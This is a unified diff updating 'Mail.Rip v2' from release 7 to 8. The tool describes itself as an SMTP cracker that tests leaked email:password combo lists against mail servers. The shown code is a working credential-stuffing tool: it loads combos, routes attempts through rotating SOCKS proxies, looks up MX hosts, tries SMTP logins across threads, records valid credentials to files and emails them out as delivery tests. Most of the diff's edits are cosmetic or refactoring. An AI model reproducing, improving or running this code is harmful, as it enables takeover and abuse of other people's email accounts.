@@ -14,16 +14,16 @@
         +-------------------------------------------------------------------+
         | PROJECT:      Mail.Rip v2                                         |
         | DESCRIPTION:  SMTP checker / SMTP cracker for mailpass combolists |
-        | RELEASE:      7 (2021-02-28)                                      |
+        | RELEASE:      8 (2021-03-10)                                      |
         | AUTHOR:       DrPython3 @ GitHub.com                              |
         +===================================================================+
-        | Based on Mail.Rip v1, this is the new and improvement version.    |
+        | Based on Mail.Rip v1, this is the new and improved version.       |
         | It is still a SMTP checker / SMTP cracker testing your mailpass   |
         | combolists for working SMTP accounts. Nevertheless, the code has  |
         | been cleaned, improved and commented.                             |
         | Mail.Rip v2 is faster and more reliable, still providing support  |
-        | for SOCKS4 / SOCKS5 proxys and the verification of working e-mail |
-        | delivery for every valid SMTP login being found. And more!        |
+        | for SOCKS4 / SOCKS5 proxys and verifying working e-mail delivery  |
+        | for every valid SMTP login being found. And more!                 |
         +-------------------------------------------------------------------+
         |                                                                   |
         |         SUPPORT THIS PROJECT: BUY ME A COFFEE OR DONATE!          |
@@ -75,8 +75,8 @@ sslcontext = ssl.create_default_context()
 locker = threading.Lock()
 attack_queue = Queue()
 
-default_timeout = float(5.0)
-default_threads = int(25)
+default_timeout = float(3.0)
+default_threads = int(9)
 default_blacklist = True
 attacker_mail = 'invalid@mail.sad'
 
@@ -206,14 +206,14 @@ def setdefaults():
     global attacker_mail
     defaults_changed = int(0)
     clean()
-    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  EDIT DEFAULT VALUES:\n' + '-'*80 + '\n')
+    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  EDIT DEFAULT VALUES:\n' + '-'*44 + '\n')
     # set amount of threads for attack:
     try:
         default_threads = int(input('\nEnter amount of threads to use:\n' + colorama.Fore.YELLOW))
         print(colorama.Fore.GREEN + f'\nThreads set to {str(default_threads)}\n')
         defaults_changed += 1
     except:
-        default_threads = int(25)
+        default_threads = int(9)
         print(colorama.Fore.RED + f'\nNo change, Mail.Rip v2 will use {str(default_threads)} threads\n')
     # set default timeout for connections:
     try:
@@ -221,7 +221,7 @@ def setdefaults():
         print(colorama.Fore.GREEN + f'\nTimeout set to {str(default_timeout)}\n')
         defaults_changed += 1
     except:
-        default_timeout = float(5.0)
+        default_timeout = float(3.0)
         print(colorama.Fore.RED + f'\nNo change, timeout remains {str(default_timeout)}\n')
     # de-/activate blacklist check for e-mail domains:
     try:
@@ -232,7 +232,7 @@ def setdefaults():
             defaults_changed +=1
         else:
             default_blacklist = True
-            print(colorama.Fore.GREEN + '\nBlacklist for e-mail domains remains activated.')
+            print(colorama.Fore.GREEN + '\nBlacklist for e-mail domains remains activated.\n')
     except:
         pass
     # set user e-mail address for delivery test:
@@ -273,7 +273,7 @@ def proxysupport():
     ip_regex = '(?:[0-9]{1,3}\.){3}[0-9]{1,3}(:[0-9]{1,5})'
     clean()
     # ask user whether to activate proxy-support:
-    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  DE-/ACTIVATE AND SCRAPE PROXYS:\n' + '-'*80 + '\n\n')
+    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  DE-/ACTIVATE AND SCRAPE PROXYS:\n' + '-'*55 + '\n\n')
     new_use = str(input('Activate proxy-support?\n(yes / no)    ' + colorama.Fore.YELLOW))
     if new_use == 'y' or new_use == 'yes':
         use_socks = True
@@ -360,7 +360,7 @@ def getrandomproxy():
     '''
     Provides a random proxy from global list "socksproxys" on every call.
 
-    :return: randomly chosen proxy
+    :return: proxy-ip
     '''
     x = randint(0, int(amount_socks))
     proxy = str(socksproxys[int(x)])
@@ -407,7 +407,7 @@ def mxlookup(worker_name, domain):
         with locker:
             print(colorama.Fore.WHITE
                   + f'[{str(worker_name)}]: Looking up SMTP-host in MX records of {str(domain)}')
-        raw_result = lookup.query(str(domain), dns.rdatatype.MX, dns.rdataclass.IN)
+        raw_result = lookup.resolve(str(domain), 'MX')
         # get first result from lookup and verify it:
         mx_host = str(raw_result[0]).split(' ')[1].rstrip('.')
         if re.search(domain_regex, mx_host):
@@ -546,7 +546,7 @@ def emailtemplate():
     Reads an user-defined e-mail template from email_template.txt and returns it
     to deliverytest-function.
 
-    :return: Template(...), True/False
+    :return: Template, True/False
     '''
     template_number = int(0)
     template_input = str('')
@@ -581,8 +581,8 @@ def deliverytest(smtphost, smtpport, smtpuser, smtppass, smtpemail, proxyip, pro
     :param str smtpuser: SMTP username
     :param str smtppass: SMTP password
     :param str smtpemail: e-mail address being used
-    :param str proxy_ip: SOCKS-proxy IP
-    :param int proxy_port: SOCKS-proxy port
+    :param str proxyip: SOCKS-proxy IP
+    :param int proxyport: SOCKS-proxy port
     :return: True, False
     '''
     global emailssent
@@ -607,13 +607,11 @@ def deliverytest(smtphost, smtpport, smtpuser, smtppass, smtpemail, proxyip, pro
                               + 'The tested SMTP login is:\n'
                               + '\n'
                               + 'START--------------------------------------------------------->>\n'
-                              + '\n'
                               + f'EMAIL: {str(smtpemail)}\n'
                               + f'HOST: {str(smtphost)}\n'
                               + f'PORT: {str(smtpport)}\n'
                               + f'USER: {str(smtpuser)}\n'
                               + f'PASS: {str(smtppass)}\n'
-                              + '\n'
                               + '<<-----------------------------------------------------------END\n'
                               + '\n'
                               + 'Please, consider a donation to support my work or just buy me a coffee.\n'
@@ -686,7 +684,7 @@ def comboloader():
     '''
     global combos
     clean()
-    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  COMBOLOADER:\n' + '-'*80 + '\n\n')
+    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  COMBOLOADER:\n' + '-'*36 + '\n\n')
     # get filename of combosource to use:
     input_file = str(input('Enter file with combos, e.g. combos.txt:\n' + colorama.Fore.YELLOW))
     if input_file == '':
@@ -737,6 +735,10 @@ def comboloader():
                     combos_cleaned.add(line)
                 else:
                     continue
+        try:
+            del combos_cleaned
+        except:
+            pass
         # -- STEP 3 --
         # load cleaned unique combos into cache for an attack:
         combos = open('targets.txt', 'r').read().splitlines()
@@ -764,20 +766,17 @@ def comboloader():
 
 def attacker(attackid, target):
     '''
-    Function for performing the attack on a target.
+    The attack performed on every single target. This function is called by the threader.
     It is full verbose and will use the writer function to save all results.
 
     :param str attackid: thread id for verbose messages
     :param str target: combo to check
-    :return: None
+    :return: True, False
     '''
-    global hits
-    global fails
-    global targetsleft
-    # set attacker ID for every thread:
+    # set attacker ID received from threader:
     attacker_id = str(f'ATTACKER#{str(attackid)}')
     try:
-        # reset the variables needed:
+        # reset the variables:
         target_email = str('')
         target_host = str('')
         target_port = int(0)
@@ -786,7 +785,7 @@ def attacker(attackid, target):
         proxy_host = str('none')
         proxy_port = int(0)
         next_combo = str('')
-        # get and set proxy if proxy-support is activated:
+        # set proxy if activated:
         if use_socks == True:
             get_proxy = str(getrandomproxy())
             proxy_host = str(get_proxy.split(':')[0])
@@ -800,13 +799,13 @@ def attacker(attackid, target):
         # if proxy-support is deactivated, set default timeout for connections:
         else:
             socket.setdefaulttimeout(float(default_timeout))
-        # get combo and set it up as next target:
+        # set combo from threader as next target:
         next_combo = str(target)
         # save that combo to checked.txt:
         result_writer = writer(str(next_combo), str('__checked__'))
         with locker:
             print(colorama.Fore.YELLOW + f'[{str(attacker_id)}]: Checking combo {str(next_combo)}')
-        # start checking process:
+        # start checking:
         target_email = str(next_combo.split(':')[0])
         target_user = str(target_email)
         target_pass = str(next_combo.split(':')[1])
@@ -825,8 +824,7 @@ def attacker(attackid, target):
                     with locker:
                         print(colorama.Fore.RED + f'[{str(attacker_id)}]: No target-host for combo {str(next_combo)}')
                     result_writer = writer(str(next_combo), str('__invalid__'))
-                    fails += 1
-                    return None
+                    return False
                 # else set target_host = unknownhost result:
                 else:
                     target_host = str(find_host)
@@ -844,17 +842,16 @@ def attacker(attackid, target):
                 with locker:
                     print(colorama.Fore.RED + f'[{str(attacker_id)}]: No target-port for combo {str(next_combo)}')
                 result_writer = writer(str(next_combo), str('__invalid__'))
-                fails += 1
-                return None
+                return False
             # else set target_port:
             else:
                 target_port = int(find_port)
         # attack the target:
-        # attack step#1 - establish connection:
+        # step#1 - establish connection:
         try:
             with locker:
                 print(colorama.Fore.WHITE
-                    + f'[{str(attacker_id)}]: Connecting to {str(target_host)} for checking {str(next_combo)}')
+                      + f'[{str(attacker_id)}]: Connecting to {str(target_host)} for checking {str(next_combo)}')
             # try SSL-connection to target:
             attack = smtplib.SMTP_SSL(target_host, target_port, timeout=default_timeout, context=sslcontext)
             with locker:
@@ -879,14 +876,13 @@ def attacker(attackid, target):
                 with locker:
                     print(colorama.Fore.RED + f'[{str(attacker_id)}]: Connection to {str(target_host)} failed')
                 result_writer = writer(str(next_combo), str('__invalid__'))
-                fails += 1
-                return None
-        # attack step#2.1 - try login with e-mail:
+                return False
+        # step#2.1 - try login with e-mail:
         try:
             with locker:
                 print(colorama.Fore.WHITE + f'[{str(attacker_id)}]: Testing login for combo {str(next_combo)}')
             attack.login(str(target_user), str(target_pass))
-        # attack step#2.2 - try login with user = e-mail pseudo if previous step fails:
+        # step#2.2 - try login with user from e-mail in case step #2.1 failed:
         except:
             try:
                 # set target_user = e-mail pseudo:
@@ -901,16 +897,16 @@ def attacker(attackid, target):
                 with locker:
                     print(colorama.Fore.RED + f'[{str(attacker_id)}]: No hit for combo {str(next_combo)}')
                 result_writer = writer(str(next_combo), str('__invalid__'))
-                fails += 1
-                return None
-        # attack step#3 - save hits to valid.txt:
+                return False
+        # step#3 - save results:
         try:
             # try to close the connection:
             attack.quit()
         except:
             pass
         with locker:
-            print(colorama.Fore.GREEN + '#'*80 + '\n' + f'[{str(attacker_id)}]: HIT FOR {str(next_combo)}\n' + '#'*80)
+            print(colorama.Fore.GREEN
+                  + '\n' + '#'*80 + '\n' + f'[{str(attacker_id)}]: HIT FOR {str(next_combo)}\n' + '#'*80 + '\n')
         # save hit to txt-file named like the SMTP-host:
         result_writer = writer(
             str(f'EMAIL: {str(target_email)}, '
@@ -925,8 +921,7 @@ def attacker(attackid, target):
                 + f'PORT: {str(target_port)}, '
                 + f'USER: {str(target_user)}, '
                 + f'PASS: {str(target_pass)}'), str('__valid__'))
-        hits += 1
-        # attack step#4 - for hits, call deliverytest function:
+        # step#4 - for hits, call deliverytest function:
         if attacker_mail == 'invalid@mail.sad':
             pass
         else:
@@ -951,26 +946,33 @@ def attacker(attackid, target):
             else:
                 with locker:
                     print(colorama.Fore.RED + f'[{str(attacker_id)}]: E-mail test failed for {str(target_email)}')
+        return True
     except:
         with locker:
             print(colorama.Fore.RED + f'[{str(attacker_id)}]: An error occurred while checking {str(next_combo)}')
         result_writer = writer(str(next_combo), str('__invalid__'))
-        fails += 1
-    return None
+        return False
 
 
 def attack_threader():
     '''
     Function for threading: gets next target from queue and starts attack function on.
+    Also updates stats for window title.
 
     :return: None
     '''
     global targetsleft
+    global hits
+    global fails
     attacker_id = str(count_threads)
     while True:
-        targetsleft -= 1
         next_target = str(attack_queue.get())
-        attacker(attacker_id, next_target)
+        result = attacker(attacker_id, next_target)
+        if result == True:
+            hits += 1
+        else:
+            fails += 1
+        targetsleft -= 1
         attack_queue.task_done()
     return None
 
@@ -984,7 +986,7 @@ def startattack():
     global count_threads
     global targetsleft
     clean()
-    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  STARTING ATTACK:\n' + '-'*80 + '\n')
+    print(colorama.Fore.YELLOW + '\n\n### MAIL.RIP V2 ###  |  STARTING ATTACK:\n' + '-'*40 + '\n')
     countdown(5)
     clean()
     # set amount of targets left to check:
@@ -1001,8 +1003,8 @@ def startattack():
     # try to show stats in window title:
     while targetsleft > 0:
         try:
-            sleep(0.5)
-            wintitle = f'LEFT TO CHECK: {str(targetsleft)} | HITS: {str(hits)} | EMAILS: {str(emailssent)} | FAILS: {str(fails)}'
+            sleep(0.1)
+            wintitle = f'TO CHECK: {str(targetsleft)} # HITS: {str(hits)} # EMAILS: {str(emailssent)} # FAILS: {str(fails)}'
             sys.stdout.write('\33]0;' + str(wintitle) + '\a')
             sys.stdout.flush()
         except:
@@ -1010,7 +1012,7 @@ def startattack():
     print(colorama.Fore.YELLOW + '\n' + '#'*44 + '\n# FINISHING ATTACK! BE PATIENT, PLEASE ... #\n' + '#'*44 + '\n')
     attack_queue.join()
     clean()
-    input(colorama.Fore.YELLOW + '\n\nINFO\n' + '-'*80 + '\n'
+    input(colorama.Fore.YELLOW + '\n\nINFO\n' + '-'*4 + '\n'
           + f'Attack has been finished or stopped. Your results: HITS = {str(hits)}, BAD = {str(fails)}.\n'
           + 'Press [ENTER] to return to the main menu.')
     return None
@@ -1033,6 +1035,7 @@ legal_logo = '''
 '''
 
 main_logo = '''
+
             ################## DrPython3 @ GitHub.Com ##################
             
              ███▄ ▄███▓ ▄▄▄       ██▓ ██▓          ██▀███   ██▓ ██▓███  
@@ -1056,7 +1059,7 @@ main_logo = '''
             
                                           [0] EXIT MAIL.RIP V2
             
-            #####################################################[v2|R7]
+            #####################################################[v2|R8]
 
 '''
 
@@ -1084,32 +1087,32 @@ def mainmenu():
     elif option == '1':
         status_msg = setdefaults()
         if status_msg == True:
-            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*80 + '\nDefault values changed.' + f'{p1}')
+            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*7 + '\nDefault values changed.' + f'{p1}')
         else:
-            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*80 + '\nDefault values not changed.' + f'{p1}')
+            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*5 + '\nDefault values not changed.' + f'{p1}')
     # option 2 for setting up proxy-support:
     elif option == '2':
         status_msg = proxysupport()
         if status_msg == True:
-            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*80
+            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*7
                   + f'\nProxy-support has been activated using {str(type_socks)} proxys.' + f'{p1}')
         else:
-            input(colorama.Fore.RED + '\n\nWARNING\n' + '-'*80 + '\nProxy-support is still deactivated.' + f'{p1}')
+            input(colorama.Fore.RED + '\n\nWARNING\n' + '-'*7 + '\nProxy-support is still deactivated.' + f'{p1}')
     # option 3 for loading combos for an attack:
     elif option == '3':
         status_msg = comboloader()
         if status_msg == True:
-            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*80
+            input(colorama.Fore.GREEN + '\n\nSUCCESS\n' + '-'*7
                   + f'\nCombos successfully loaded. Amount: {str(len(combos))}' + f'{p1}')
         else:
-            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*80 + '\nLoading combos failed.' + f'{p1}')
+            input(colorama.Fore.RED + '\n\nERROR\n' + '-'*5 + '\nLoading combos failed.' + f'{p1}')
     # option 4 for starting an attack:
     elif option == '4':
         startattack()
     # any other input restarts the mainmenu function:
     else:
         clean()
-        input(colorama.Fore.YELLOW + 'INFO\n' + '-'*80 + '\nNo option entered.' + f'{p1}')
+        input(colorama.Fore.YELLOW + 'INFO\n' + '-'*4 + '\nNo option entered.' + f'{p1}')
     return None
 
 
@@ -1125,6 +1128,7 @@ if legal_confirm == 'NO' or legal_confirm == 'no' or legal_confirm == 'n':
              + '<< Legal Notices >>.\n\n')
 else:
     pass
+
 # after confirmation start main menu:
 while True:
     mainmenu()
